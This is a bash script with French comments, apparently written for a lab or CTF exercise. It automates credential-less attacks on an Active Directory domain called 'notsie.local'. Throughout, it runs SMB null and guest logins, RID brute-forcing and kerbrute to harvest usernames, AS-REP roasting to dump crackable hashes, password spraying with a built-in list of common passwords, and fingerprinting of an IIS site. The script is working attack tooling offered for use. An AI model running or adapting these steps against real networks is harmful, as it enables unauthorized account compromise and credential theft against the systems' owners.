#!/usr/bin/env bash
# Notsie AD - enum initiale sans creds. Lancer sur Kali (VPN equipe actif).
#   ./notsie.sh
set -u
RELAY=10.100.23.101
DOMAIN=notsie.local
DC=dc01.notsie.local
REALM=NOTSIE.LOCAL

# outils (nxc ou crackmapexec)
NXC=$(command -v nxc || command -v netexec || command -v crackmapexec)
GETNP=$(command -v impacket-GetNPUsers || command -v GetNPUsers.py)
WL=/usr/share/seclists/Usernames/Names/names.txt
[ -f "$WL" ] || WL=/usr/share/seclists/Usernames/xato-net-10-million-usernames-dup.txt

bar(){ echo; echo "=================== $* ==================="; }

bar "0) horloge synchro sur le DC (Kerberos)"
sudo ntpdate -u "$RELAY" 2>/dev/null || sudo rdate -n "$RELAY" 2>/dev/null || echo "  (sync manuelle si besoin)"

bar "1) SMB null + guest"
$NXC smb "$RELAY" -u '' -p '' 2>/dev/null
$NXC smb "$RELAY" -u guest -p '' --shares 2>/dev/null

bar "2) RID brute -> users.txt"
: > users.txt
for U in guest 'a' ''; do
  $NXC smb "$RELAY" -u "$U" -p '' --rid-brute 4000 2>/dev/null \
    | grep -i SidTypeUser | sed -E 's/.*\\\\([^ ]+) .*/\1/' >> users.txt
done
sort -u users.txt -o users.txt
sed -i '/^$/d' users.txt
echo "  -> $(wc -l < users.txt) comptes :"; cat users.txt

bar "3) (fallback) Kerberos userenum si RID brute vide"
if [ ! -s users.txt ] && [ -f "$WL" ]; then
  kerbrute userenum -d "$DOMAIN" --dc "$RELAY" "$WL" 2>/dev/null \
    | grep VALID | sed -E 's/.*VALID USERNAME:\s+([^@ ]+).*/\1/' | sort -u > users.txt
  echo "  -> $(wc -l < users.txt) comptes"; cat users.txt
fi

bar "4) AS-REP roast (comptes sans preauth, sans creds)"
if [ -s users.txt ]; then
  $GETNP "$DOMAIN"/ -usersfile users.txt -dc-ip "$RELAY" -dc-host "$DC" \
    -no-pass -format hashcat -outputfile asrep.txt 2>/dev/null
  [ -s asrep.txt ] && { echo "  [+] HASH(s) AS-REP :"; cat asrep.txt; } || echo "  (aucun compte DONT_REQ_PREAUTH)"
fi

bar "5) spray leger (ATTENTION lockout - liste courte)"
if [ -s users.txt ]; then
  cat > pw.txt <<EOF
Welcome1
Password1
P@ssw0rd
Notsie2026!
Summer2026!
changeme
EOF
  echo "  -- user == password --"
  $NXC smb "$RELAY" -u users.txt -p users.txt --no-bruteforce --continue-on-success 2>/dev/null | grep -i '\[+\]'
  echo "  -- mots de passe communs --"
  $NXC smb "$RELAY" -u users.txt -p pw.txt --continue-on-success 2>/dev/null | grep -i '\[+\]'
fi

bar "6) site IIS 8080"
curl -ski "http://$RELAY:8080/" | head -40
command -v whatweb >/dev/null && whatweb "http://$RELAY:8080/"

echo; echo "=== FINI. Colle-moi: users.txt, asrep.txt (si present), les [+] du spray, et le 8080 ==="
